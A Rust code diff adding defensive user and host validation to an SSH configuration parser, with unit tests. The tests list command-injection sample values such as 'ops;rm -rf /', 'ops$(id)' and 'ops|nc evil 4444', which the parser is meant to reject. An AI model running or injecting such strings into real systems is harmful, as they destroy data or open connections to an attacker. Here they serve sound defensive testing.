@@ -151,6 +151,30 @@ impl NamespaceConfig {
                 field: "user",
             });
         }
+        // S4 (post-v0.1.3 security audit): reject shell metacharacters
+        // and whitespace in `user` / `host`. Both are passed to ssh as
+        // separate argv entries (so direct command injection isn't
+        // possible) but ssh_config `Match exec` blocks expand `%u` /
+        // `%h` into shell strings — see CVE-2026-35386. A defense-in-
+        // depth shape check at config-parse time is cheaper than
+        // proving every ssh_config on every operator's machine is
+        // free of `Match exec` blocks that consume those tokens.
+        if let Some(u) = self.user.as_deref() {
+            if !is_valid_user(u) {
+                return Err(ConfigError::InvalidUser {
+                    namespace: namespace.to_string(),
+                    user: u.to_string(),
+                });
+            }
+        }
+        if let Some(h) = self.host.as_deref() {
+            if !is_valid_host(h) {
+                return Err(ConfigError::InvalidHost {
+                    namespace: namespace.to_string(),
+                    host: h.to_string(),
+                });
+            }
+        }
         if self.key_path.is_some() && self.key_inline.is_some() {
             return Err(ConfigError::ConflictingKeySources);
         }
@@ -216,6 +240,36 @@ pub fn is_valid_env_key(s: &str) -> bool {
         _ => return false,
     }
     chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
+/// S4 (post-v0.1.3 security audit): POSIX-portable login-name shape,
+/// `[A-Za-z_][A-Za-z0-9_.-]*`, max 64 chars. Same shape `useradd(8)`
+/// enforces by default. Defense-in-depth against ssh_config
+/// `Match exec %u` expansion (CVE-2026-35386 family).
+pub fn is_valid_user(s: &str) -> bool {
+    if s.is_empty() || s.len() > 64 {
+        return false;
+    }
+    let mut chars = s.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))
+}
+
+/// S4 (post-v0.1.3 security audit): IP literal or DNS-shaped name.
+/// We are deliberately permissive — `:` for IPv6 literals, `[]` for
+/// bracketed IPv6, `.` for IPv4 / DNS, `-` and alnum for DNS labels
+/// — and reject anything else. Whitespace, `;`, `&`, `|`, `$`, `\``,
+/// `'`, `"`, `(`, `)`, `<`, `>` etc. are out so a hostile value can
+/// never be expanded inside an ssh_config `%h` token.
+pub fn is_valid_host(s: &str) -> bool {
+    if s.is_empty() || s.len() > 255 {
+        return false;
+    }
+    s.chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':' | '[' | ']' | '_'))
 }
 
 /// Where a namespace was sourced from after merging.
@@ -317,6 +371,92 @@ mod tests {
         assert!(validate_namespace_name("").is_err());
         assert!(validate_namespace_name("-bad").is_err());
         assert!(validate_namespace_name("bad name").is_err());
+    }
+
+    // ---- S4 (post-v0.1.3 security audit): user / host shape ---------------
+
+    #[test]
+    fn s4_user_shape_accepts_posix_login_names() {
+        assert!(is_valid_user("ops"));
+        assert!(is_valid_user("deploy_bot"));
+        assert!(is_valid_user("svc.app"));
+        assert!(is_valid_user("user-1"));
+        assert!(is_valid_user("_internal"));
+    }
+
+    #[test]
+    fn s4_user_shape_rejects_shell_metacharacters() {
+        // Every char from the classic command-injection ladder.
+        for bad in [
+            "ops;rm -rf /",
+            "ops$(id)",
+            "ops`id`",
+            "ops|nc evil 4444",
+            "ops&disown",
+            "ops>/etc/passwd",
+            "ops<input",
+            "'ops'",
+            "\"ops\"",
+            "(ops)",
+            "ops with space",
+            "ops\nnewline",
+            "ops\\backslash",
+            "ops!bang",
+            "ops*glob",
+            "ops?glob",
+            "ops#hash",
+            "",
+        ] {
+            assert!(!is_valid_user(bad), "should reject: {bad:?}");
+        }
+    }
+
+    #[test]
+    fn s4_host_shape_accepts_dns_and_ip_literals() {
+        assert!(is_valid_host("example.com"));
+        assert!(is_valid_host("db-prod-01.internal"));
+        assert!(is_valid_host("10.0.0.5"));
+        assert!(is_valid_host("[2001:db8::1]"));
+        assert!(is_valid_host("fe80::1"));
+        assert!(is_valid_host("localhost"));
+    }
+
+    #[test]
+    fn s4_host_shape_rejects_shell_metacharacters() {
+        for bad in [
+            "host;evil",
+            "host$(id)",
+            "host`id`",
+            "host with space",
+            "host|pipe",
+            "host&background",
+            "host>file",
+            "'host'",
+            "host\nnewline",
+            "",
+        ] {
+            assert!(!is_valid_host(bad), "should reject: {bad:?}");
+        }
+    }
+
+    #[test]
+    fn s4_validate_rejects_hostile_user() {
+        let mut c = cfg(Some("h"), Some("ops;rm -rf /"), None);
+        c.key_path = Some("/tmp/k".into());
+        assert!(matches!(
+            c.validate("ns"),
+            Err(ConfigError::InvalidUser { .. })
+        ));
+    }
+
+    #[test]
+    fn s4_validate_rejects_hostile_host() {
+        let mut c = cfg(Some("$(id)"), Some("ops"), None);
+        c.key_path = Some("/tmp/k".into());
+        assert!(matches!(
+            c.validate("ns"),
+            Err(ConfigError::InvalidHost { .. })
+        ));
     }
 
     // ---- L4 (v0.1.3): auth / password_env / session_ttl --------------------
